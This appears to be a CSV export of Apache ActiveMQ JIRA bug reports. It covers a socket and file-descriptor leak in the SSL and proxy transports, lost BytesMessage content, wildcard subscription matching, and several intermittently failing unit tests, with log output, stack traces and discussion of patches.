Apparently some clean-up invocations were missing in SSLNIOTransport as well. This resulted in many leaked file descriptors in linux (RHEL 6.3 64 bit). 

Before the attached patches the lsof command gave tons of
{noformat}
java    6530 platone    8u  sock                0,6      0t0 2489682586 can't identify protocol
java    6530 platone    9u  sock                0,6      0t0 2489745273 can't identify protocol
java    6530 platone   15u  sock                0,6      0t0 2489727545 can't identify protocol
java    6530 platone   66u  sock                0,6      0t0 2489683982 can't identify protocol
java    6530 platone   69u  sock                0,6      0t0 2489684335 can't identify protocol
java    6530 platone   72u  sock                0,6      0t0 2489684339 can't identify protocol
java    6530 platone   74u  sock                0,6      0t0 2489684688 can't identify protocol
java    6530 platone   76u  sock                0,6      0t0 2489685055 can't identify protocol
java    6530 platone   77u  sock                0,6      0t0 2489716539 can't identify protocol
java    6530 platone   97u  sock                0,6      0t0 2489683431 can't identify protocol
java    6530 platone   98u  sock                0,6      0t0 2489683450 can't identify protocol
java    6530 platone   99u  sock                0,6      0t0 2489684695 can't identify protocol
java    6530 platone  100u  sock                0,6      0t0 2489683990 can't identify protocol
java    6530 platone  101u  sock                0,6      0t0 2489702245 can't identify protocol
java    6530 platone  102u  sock                0,6      0t0 2489685058 can't identify protocol
...
{noformat}
(see attached lsof.txt) with the following socket stats:
{noformat}
sockets: used 3067
TCP: inuse 21 orphan 0 tw 0 alloc 2808 mem 2648
UDP: inuse 6 mem 5
UDPLITE: inuse 0
RAW: inuse 1
FRAG: inuse 0 memory 0
{noformat}
and the following netstat outcome:
{noformat}
...
tcp        0      0 ::ffff:192.168.24.82:44201  ::ffff:192.168.16.166:61616 ESTABLISHED 6530/java           off (0.00/0/0)
tcp        0      0 ::ffff:192.168.24.82:61619  ::ffff:192.168.24.66:64601  CLOSE_WAIT  6530/java           off (0.00/0/0)
tcp        0      0 ::ffff:192.168.24.82:61619  ::ffff:192.168.24.67:9033   CLOSE_WAIT  6530/java           off (0.00/0/0)
tcp        0      0 ::ffff:192.168.24.82:61619  ::ffff:192.168.24.66:56924  CLOSE_WAIT  6530/java           off (0.00/0/0)
tcp        0      0 ::ffff:192.168.24.82:61619  ::ffff:192.168.24.66:33021  CLOSE_WAIT  6530/java           off (0.00/0/0)
tcp        0      0 ::ffff:192.168.24.82:61619  ::ffff:192.168.24.67:56879  CLOSE_WAIT  6530/java           off (0.00/0/0)
tcp        0      0 ::ffff:192.168.24.82:61619  ::ffff:192.168.24.67:51487  CLOSE_WAIT  6530/java           off (0.00/0/0)
tcp        0      0 ::ffff:192.168.24.82:61619  ::ffff:192.168.24.66:35295  CLOSE_WAIT  6530/java           off (0.00/0/0)
tcp        0      0 ::ffff:192.168.24.82:61619  ::ffff:192.168.24.67:49529  CLOSE_WAIT  6530/java           off (0.00/0/0)
tcp        0      0 ::ffff:192.168.24.82:61619  ::ffff:192.168.24.67:51309  CLOSE_WAIT  6530/java           off (0.00/0/0)
... many other CLOSE_WAIT
{noformat}
We applied the attached patches and everything run better: the lsof stopped reporting the _can't identify protocol_ records and the number of connections in CLOSE_WAIT dropped to zero.

So what? Does it make sense to you?;;;","02/Dec/13 08:39;matteor;Still an issue in long-term memory consumption due to another bug in ProxyConnector: missing equals and hashCode methods in ProxyConnections induced a memory leakeage in connections collection inside ProxyConnector.

I added another patch to solve also this issue.;;;","04/Dec/13 16:12;tabish;I've reviewed the attached patches, looks pretty good.  I applied the fix to the NIOSSLTransport.  The equals method in the ProxyConnection looks a bit odd, think maybe the equals comparison might be backwards.  I updated the fix a bit with some additional changes.  You should take a look and test in your setup.  Would be great if you can boil down the tests into a JUnit test of sorts so we can see if things are working as expected.  ;;;","04/Dec/13 16:13;tabish;Proposed patch for this issue that addresses the cleanup code in the Proxy classes.;;;","04/Dec/13 16:49;matteor;Actually, swapping the start method and the connections.add() in setAcceptListener method in ProxyConnector turned out not to be a good idea. The _connections.remove()_ in TransportFilter.stop may be called before the connections.add() is invoked.
I appreciate this in the form of a tiny yet continous memory leakeage due to objects accumulating in connections collection.

Therefore I modified again the ProxyConnector code to fix also this sort of race condition: now I invoke the connections.add() _before_ invoking the start but I manage the removal inside a try-catch block (see the updated ProxyConnector_patch_AMQ_4889.txt patch)

Besides, I had to modify the equals method in ProxyConnection to avoid NPE in case local or remote transorts are null. I updated the ProxyConnection_patch_AMQ_4889.txt file with this fix.
I'm not completely satisfied with this ProxyConnection.equals() method, since it seems a little bit awkward to me. I don't know, maybe you can suggest a better strategy to purge the connections list.

The patch is running for hours now and the issue seems to be fixed. I'll double check ram consumption tomorrow to have a stronger feedback.
;;;","09/Dec/13 18:08;matteor;With the last checks and updates the ProxyConnector has been working great for days now: heap memory consumption is stable. I'll try to improve/simplify the test case in ProxyConnIssue.rar in the next days.

It would be great if I could have some feedbacks on the last patches I created.;;;","16/Dec/13 17:14;kearls;Fixed with checkin 257710ba1a40e0ac78f5f8035d9663775e122d41.  Thanks for the patches.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
ActiveMQBytesMessage will lost content if message's property was set before copy ,AMQ-4887,12679335,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,tabish,caoyunfei,caoyunfei,15/Nov/13 04:02,26/Jan/16 09:29,14/Jul/23 05:43,13/Dec/13 15:55,5.9.0,,,,,5.10.0,5.9.1,,Broker,,,,0,,,,,,,,,"ActiveMQBytesMessage will lost content if message's property was set before copy. Here is the test code:

Producer:
MessageProducer producer;  
//initialize Connection, Session, MessageProducer    
byte[] bs = ""bytes message"".getBytes();  
BytesMessage message = session.createBytesMessage();  
message.writeBytes(bs);  //write bytes to message 1
  
for(int i=0; i< 0; i++){  
  // then set message's propery   2
    message.setLongProperty(""sendTime"", System.currentTimeMillis());  
    try{  
        producer.send(message);  
    }catch(){  
         e.printStackTrace();  
    }
}  

Consumer:

MessageConsumer consumer  
//initailize Connection, Session, MessageConsumer  
for(int i=0; i<10; i++){  
    ActiveMQBytesMessage msg = (ActiveMQBytesMessage)consumer.receive(60*1000);  
    long sendTime = message.getLongProperty(""sendTime"");  
    System.out.println(""sendtime:"" + sendTime);  
    ByteSequence bs = message.getMessage().getContent();  
    System.out.println(""bytes data:"" + new String(bs.getData()));  
}  

Expected result:
consumer gets bytes data in all received messages

Actual result:
only the fisrt message has bytes data, all other messages lost bytes data, while long property value is not lost;

Analysization:
message gets copied when send, it will call storeContent() before copy,  DataOutputStream dataOut will be closed and the data in dataOut will be set to conent. This works correctly if there are no property was set.

when setLongProperty was called, it will call setObjectProperty() then will call  initializeWriting(), here DataOutputStream dataOut  will be create AGAIN. 

So when message was copied in second time, DataOutputStream dataOut is NOT null, but EMPTY, it will clear the value in content.

suggestion:
restore the content data to DataOutputStream dataOut when nitializeWriting()

my fix:
ActiveMQBytesMessage :
 private void  initializeWriting() throws JMSException {
669        The original code
                ......
701        
            //fix code
            if(this.content !=null && this.content.length >0){
                try{
                    this.dataOut.write(this.content.getData());
                }catch(IOException ioe){
                    throw JMSExceptionSupport.create(ioe);
                }
            }
702    }",,caoyunfei,kearls,tabish,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,86400,86400,,0%,86400,86400,,,,,,,,,,,,,,,,,,,,,AMQ-6142,,,,,,,,,,,,,"05/Dec/13 21:00;tabish;AMQ-4887.patch;https://issues.apache.org/jira/secure/attachment/12617239/AMQ-4887.patch","05/Dec/13 09:02;kearls;AMQ-4887.patch;https://issues.apache.org/jira/secure/attachment/12617133/AMQ-4887.patch","03/Dec/13 01:57;caoyunfei;ActiveMQBytesMessage.java.patch;https://issues.apache.org/jira/secure/attachment/12616672/ActiveMQBytesMessage.java.patch","03/Dec/13 07:52;caoyunfei;ActiveMQBytesMessageTest.java;https://issues.apache.org/jira/secure/attachment/12616713/ActiveMQBytesMessageTest.java","03/Dec/13 07:52;caoyunfei;Consumer.java;https://issues.apache.org/jira/secure/attachment/12616714/Consumer.java","03/Dec/13 07:52;caoyunfei;Producer.java;https://issues.apache.org/jira/secure/attachment/12616712/Producer.java",,,,,,,,,,,,,,,,6.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,358697,,,Fri Dec 13 15:55:48 UTC 2013,,,,,,,,,,,"0|i1pu1r:",358987,,,,,,,,,,,,,,,,,,,,,"25/Nov/13 15:25;tabish;Recommend you create a proper JUnit test case and a patch with your fix for use to review.  ;;;","03/Dec/13 01:57;caoyunfei;patch for bug AMQ-4887;;;","03/Dec/13 02:08;tabish;Still needs a unit test.;;;","03/Dec/13 07:52;caoyunfei;unit test for bug AMQ-4887;;;","05/Dec/13 09:02;kearls;This is a slightly modified version of the original patch.  Tim, can you review this?

I have also added a test, AMQ4887Test.java to activemq-unit-tests
;;;","05/Dec/13 11:32;tabish;I'll review in a bit;;;","05/Dec/13 16:13;tabish;The fix seems reasonable but I think there's still a problem here if the content is stored compressed.  If you simply rewrite the contents into the output stream and message compression is enabled you'd be writing compressed data with an output stream that's doing compression again so that's not good, plus you be adding new data onto already compressed content if you use any of the write methods so you are doubly corrupted.  ;;;","05/Dec/13 16:19;tabish;I'm also going to guess that the StreamMessage implementation suffers from the same problem and the test should be expanded to check that message too, as well as the compressed case.  ;;;","05/Dec/13 21:00;tabish;[~kearls] Updated the test case to show the other bits that are broken.  I patched the bytes message and started Stream Message.  Thought you might want to take a crack at addressing the compressed case in StreamMessage and seeing if there's anything else needed.;;;","05/Dec/13 21:00;tabish;Updated patch that fixes bytes message and the uncompressed case in stream message.;;;","13/Dec/13 15:55;tabish;Wrapped this one up as I was afraid I might be seeing this in some AMQP dispatch scenarios.  ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Wildcard matches do not match,AMQ-4884,12679071,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,rajdavies,rajdavies,rajdavies,13/Nov/13 18:46,29/Mar/17 09:11,14/Jul/23 05:43,21/Mar/14 20:10,5.8.0,5.9.0,,,,5.10.0,5.9.1,,Broker,,,,0,,,,,,,,,If you subscribe to a Wildcard Destination (e.g. a Topic) - with an name A.*.> then a message sent to a Destination A.B should match that Wildcard and be assigned to that Subscriber. This is not the case currently.,,dhirajsb,githubbot,rajdavies,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-5074,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,358436,,,Wed Mar 29 09:11:06 UTC 2017,,,,,,,,,,,"0|i1psfr:",358726,,,,,,,,,,,,,,,,,,,,,"13/Nov/13 18:58;rajdavies;Fixed by:
Branch: refs/heads/trunk
Commit: 7f639a60473c903333b0b0adabdc5473f54cf5ce
Parents: 2a6aab4;;;","14/Nov/13 09:38;rajdavies;There's another case where A does not match A.> - its arguable if it should but to be compatible with MQTT wildcards on topics it does need to.;;;","21/Mar/14 19:56;dhirajsb;With the MQTT path fix in AMQ-5074, we can mark this as resolved. ;;;","29/Mar/17 09:11;githubbot;Github user dejanb commented on the issue:

    https://github.com/apache/activemq-artemis/pull/1150
  
    @clebertsuconic I found original Jiras why this test was added
    
    https://issues.apache.org/jira/browse/AMQ-4884
    https://issues.apache.org/jira/browse/AMQ-5074
    
    I think we should support this, so I'll take more look into it.
;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
fix web site,AMQ-4880,12678930,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,ceposta,dkulp,dkulp,13/Nov/13 02:16,13/Nov/13 16:30,14/Jul/23 05:43,13/Nov/13 16:30,,,,,,,,,,,,,0,,,,,,,,,"
Just a patch to fix some more issues with the website.  

This SHOULD get it and the blog entries rendering completely again.
",,ceposta,dkulp,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"13/Nov/13 02:17;dkulp;amqsite.patch;https://issues.apache.org/jira/secure/attachment/12613502/amqsite.patch",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,358296,,,Wed Nov 13 16:30:57 UTC 2013,,,,,,,Patch Available,,,,"0|i1prkn:",358586,,,,,,,,,,,,,,,,,,,,,"13/Nov/13 02:17;dkulp;apply in https://svn.apache.org/repos/asf/activemq/activemq-website

then remove the caches in:

https://svn.apache.org/repos/infra/websites/production/activemq/content/cache;;;","13/Nov/13 16:30;ceposta;Patch committed on svn r1541592
Caches cleared on svn r886521.

Thanks dkulp!;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
QueueMbeanRestartTest fails intermittently,AMQ-4877,12678820,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,,kearls,kearls,12/Nov/13 15:13,12/Nov/13 15:23,14/Jul/23 05:43,12/Nov/13 15:23,,,,,,,,,Test Cases,,,,0,,,,,,,,,"This test fails intermittently, usually on slower boxes.  It will get a stack trace like the one shown below.  The root cause can be seen in the log:

2013-11-09 11:04:19,771 [JMX connector  ] - WARN  ManagementContext              - Failed to start JMX connector Cannot bind to URL [rmi://localhost:1099/jmxrmi]: javax.naming.NameAlreadyBoundException: jmxrmi [Root exception is java.rmi.AlreadyBoundException: jmxrmi]. Will restart management to re-create JMX connector, trying to remedy this issue.

This appears to be the result of a quick server shutdown/restart.  I'll add a sleep to the test to avoid this.


java.net.SocketTimeoutException: Read timed out
	at java.net.SocketInputStream.socketRead0(Native Method)
	at java.net.SocketInputStream.read(SocketInputStream.java:129)
	at com.sun.net.ssl.internal.ssl.InputRecord.readFully(InputRecord.java:422)
	at com.sun.net.ssl.internal.ssl.InputRecord.read(InputRecord.java:460)
	at com.sun.net.ssl.internal.ssl.SSLSocketImpl.readRecord(SSLSocketImpl.java:863)
	at com.sun.net.ssl.internal.ssl.SSLSocketImpl.performInitialHandshake(SSLSocketImpl.java:1188)
	at com.sun.net.ssl.internal.ssl.SSLSocketImpl.startHandshake(SSLSocketImpl.java:1215)
	at com.sun.net.ssl.internal.ssl.SSLSocketImpl.startHandshake(SSLSocketImpl.java:1199)
	at org.apache.activemq.transport.tcp.SslContextNBrokerServiceTest.verifySslCredentials(SslContextNBrokerServiceTest.java:76)
	at org.apache.activemq.transport.tcp.SslContextNBrokerServiceTest.verifyCredentials(SslContextNBrokerServiceTest.java:57)
	at org.apache.activemq.transport.tcp.SslContextNBrokerServiceTest.testConfigurationIsolation(SslContextNBrokerServiceTest.java:47)
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
	at java.lang.reflect.Method.invoke(Method.java:597)
	at junit.framework.TestCase.runTest(TestCase.java:176)
	at junit.framework.TestCase.runBare(TestCase.java:141)
	at junit.framework.TestResult$1.protect(TestResult.java:122)
	at junit.framework.TestResult.runProtected(TestResult.java:142)
	at junit.framework.TestResult.run(TestResult.java:125)
	at junit.framework.TestCase.run(TestCase.java:129)
	at junit.framework.TestSuite.runTest(TestSuite.java:255)
	at junit.framework.TestSuite.run(TestSuite.java:250)
	at org.junit.internal.runners.JUnit38ClassRunner.run(JUnit38ClassRunner.java:84)
	at org.apache.maven.surefire.junit4.JUnit4TestSet.execute(JUnit4TestSet.java:53)
	at org.apache.maven.surefire.junit4.JUnit4Provider.executeTestSet(JUnit4Provider.java:123)
	at org.apache.maven.surefire.junit4.JUnit4Provider.invoke(JUnit4Provider.java:104)
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
	at java.lang.reflect.Method.invoke(Method.java:597)
	at org.apache.maven.surefire.util.ReflectionUtils.invokeMethodWithArray(ReflectionUtils.java:164)
	at org.apache.maven.surefire.booter.ProviderFactory$ProviderProxy.invoke(ProviderFactory.java:110)
	at org.apache.maven.surefire.booter.SurefireStarter.invokeProvider(SurefireStarter.java:175)
	at org.apache.maven.surefire.booter.SurefireStarter.runSuitesInProcessWhenForked(SurefireStarter.java:81)
	at org.apache.maven.surefire.booter.ForkedBooter.main(ForkedBooter.java:68)",,kearls,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,358187,,,Tue Nov 12 15:23:21 UTC 2013,,,,,,,,,,,"0|i1pqwf:",358477,Unit Test Broken,,,,,,,,,,,,,,,,,,,,"12/Nov/13 15:23;kearls;Added timeout in commit 0ed2ddb3df687f5e977b21b0394139efbfd8846f
;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
DurableSubscriptionOfflineTest.testOrderOnActivateDeactivate fails on CI boxes,AMQ-4874,12678783,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,kearls,kearls,kearls,12/Nov/13 12:13,02/Apr/14 22:15,14/Jul/23 05:43,08/Jan/14 16:41,,,,,,5.10.0,5.9.1,,Test Cases,,,,1,,,,,,,,,"This test fails intermittently on CI boxes.  When it fails it sometimes causes the build to hang, and other times just causes no results to be reported from this suite.  I'll comment the test out for now.

It might be a good idea to break this test up into several smaller test suites.  It certainly would make debugging easier.",,gtully,kearls,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,358150,,,Wed Jan 08 16:41:37 UTC 2014,,,,,,,,,,,"0|i1pqo7:",358440,Unit Test Broken,,,,,,,,,,,,,,,,,,,,"12/Nov/13 14:21;tabish;Yes, this one is in need of some refactoring.  ;;;","19/Dec/13 13:40;kearls;I split this up into 5 parts, DurableSubscriptionOfflineTest, DurableSubscriptionOffline1Test, DurableSubscriptionOffline2Test, DurableSubscriptionOffline3Test, and DurableSubscriptionOffline4Test, using JUnit4 Parameterized instead of CombinationTestSupport.

This will make debugging easier, and also eliminate problems sometimes seen with CombinationTestSupport and AutoFailTestSupport.

The testOrderOnActivateDeactivate test case is still failing and still needs to be resolved.
;;;","08/Jan/14 14:36;gtully;I increased the number of iterations on this test b/c it was relevant to the fix for https://issues.apache.org/jira/browse/AMQ-4952 but I could not get the test to fail  - testOrderOnActivateDeactivate that is. I wonder if the test can be tweaked to demo the failure reliably.
Or maybe the test is fixed by the changes for AMQ-4952 :-)
;;;","08/Jan/14 16:41;kearls;Looks like this was fixed by Gary's changes for AMQ-4952.  I removed the @Ignore for this test.
;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Wrong JMX object name created in RemoteJMXBrokerFacade,AMQ-4869,12678606,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,tabish,tabish,tabish,11/Nov/13 17:02,02/Apr/14 23:49,14/Jul/23 05:43,11/Nov/13 19:01,5.9.0,,,,,5.10.0,5.9.1,,Web Console,,,,0,,,,,,,,,When a broker name is given the console code create the wrong broker object name,,tabish,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-4870,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,357973,,,2013-11-11 17:02:31.0,,,,,,,,,,,"0|i1ppl3:",358263,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
WSServlet.doWebSocketConnect throws NPE if called with null protocol,AMQ-4857,12678252,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,kearls,kearls,kearls,08/Nov/13 16:19,11/Jun/14 01:21,14/Jul/23 05:43,08/Nov/13 17:04,,,,,,5.10.0,5.9.1,,,,,,0,,,,,,,,,"I got the NPE shown below while working on a websocket demo.   WebSocketFactory.acceptWebSocket calls WSServlet.doWebSocketConnect with the protocol hard coded to null.

java.lang.NullPointerException
	at org.apache.activemq.transport.ws.WSServlet.doWebSocketConnect(WSServlet.java:54)
	at org.eclipse.jetty.websocket.WebSocketFactory.acceptWebSocket(WebSocketFactory.java:372)
	at org.eclipse.jetty.websocket.WebSocketServlet.service(WebSocketServlet.java:104)
	at javax.servlet.http.HttpServlet.service(HttpServlet.java:806)
	at org.eclipse.jetty.servlet.ServletHolder.handle(ServletHolder.java:652)
	at org.eclipse.jetty.servlet.ServletHandler.doHandle(ServletHandler.java:445)
	at org.eclipse.jetty.server.handler.ContextHandler.doHandle(ContextHandler.java:1044)
	at org.eclipse.jetty.servlet.ServletHandler.doScope(ServletHandler.java:372)
	at org.eclipse.jetty.server.handler.ContextHandler.doScope(ContextHandler.java:978)
	at org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:135)
	at org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:116)
	at org.eclipse.jetty.server.Server.handle(Server.java:367)
	at org.eclipse.jetty.server.AbstractHttpConnection.handleRequest(AbstractHttpConnection.java:486)
	at org.eclipse.jetty.server.AbstractHttpConnection.headerComplete(AbstractHttpConnection.java:926)
	at org.eclipse.jetty.server.AbstractHttpConnection$RequestHandler.headerComplete(AbstractHttpConnection.java:988)
	at org.eclipse.jetty.http.HttpParser.parseNext(HttpParser.java:640)
	at org.eclipse.jetty.http.HttpParser.parseAvailable(HttpParser.java:235)
	at org.eclipse.jetty.server.AsyncHttpConnection.handle(AsyncHttpConnection.java:82)
	at org.eclipse.jetty.io.nio.SelectChannelEndPoint.handle(SelectChannelEndPoint.java:628)
	at org.eclipse.jetty.io.nio.SelectChannelEndPoint$1.run(SelectChannelEndPoint.java:52)
	at org.eclipse.jetty.util.thread.QueuedThreadPool.runJob(QueuedThreadPool.java:608)
	at org.eclipse.jetty.util.thread.QueuedThreadPool$3.run(QueuedThreadPool.java:543)
	at java.lang.Thread.run(Thread.java:744)",,artnaseef,kearls,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,357627,,,Wed Jun 11 01:21:04 UTC 2014,,,,,,,,,,,"0|i1pngf:",357917,,,,,,,,,,,,,,,,,,,,,"08/Nov/13 17:04;kearls;Added test for null before accessing protocol string
;;;","11/Jun/14 01:21;artnaseef;Fix revision: https://git-wip-us.apache.org/repos/asf?p=activemq.git;a=commit;h=692428eee5f7af1118881c1140ff45cd33e99d18;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Typos in SubscriptionInfo,AMQ-4855,12678138,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,tabish,fribeiro,fribeiro,08/Nov/13 02:57,02/Apr/14 23:50,14/Jul/23 05:43,11/Nov/13 16:47,5.9.0,,,,,5.10.0,5.9.1,,Broker,,,,0,,,,,,,,,"The typos in properties ""subcriptionId"" and ""subcriptionName"" require changes in multiple classes, but should be fixed, even if only in a major release.",All supported environments.,fribeiro,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"08/Nov/13 02:57;fribeiro;activemq.patch;https://issues.apache.org/jira/secure/attachment/12612767/activemq.patch",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,357513,,,Wed Nov 13 21:46:14 UTC 2013,,,,,,,Patch Available,,,,"0|i1pmr3:",357803,,,,,,,,,,,,,,,,,,,,,"11/Nov/13 16:47;tabish;Deprecated the older misspelled variants and added new one's to the front facing JMX views.  Replaced the usages of the older misspelled openwire commands versions in the tests and some bits of code.  The misspelled variants remain in the openwire commands for legacy reason.  ;;;","13/Nov/13 21:46;fribeiro;Thanks!;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
JmsRollbackRedeliveryTest.testRedeliveryWithPrefetch1 fails intermittently,AMQ-4854,12677984,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,kearls,kearls,kearls,07/Nov/13 12:38,02/Apr/14 23:51,14/Jul/23 05:43,14/Feb/14 16:37,,,,,,5.10.0,5.9.1,,Test Cases,,,,0,,,,,,,,,"This tests fails on some CI boxes and slow machines

javax.jms.JMSException: peer (vm://localhost#5) stopped.
	at org.apache.activemq.util.JMSExceptionSupport.create(JMSExceptionSupport.java:54)
	at org.apache.activemq.ActiveMQConnection.syncSendPacket(ActiveMQConnection.java:1405)
	at org.apache.activemq.ActiveMQConnection.ensureConnectionInfoSent(ActiveMQConnection.java:1510)
	at org.apache.activemq.ActiveMQConnection.start(ActiveMQConnection.java:524)
	at org.apache.activemq.JmsRollbackRedeliveryTest.doTestRedelivery(JmsRollbackRedeliveryTest.java:84)
	at org.apache.activemq.JmsRollbackRedeliveryTest.testRedeliveryWithPrefetch1(JmsRollbackRedeliveryTest.java:76)
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
	at java.lang.reflect.Method.invoke(Method.java:601)
	at junit.framework.TestCase.runTest(TestCase.java:176)
	at junit.framework.TestCase.runBare(TestCase.java:141)
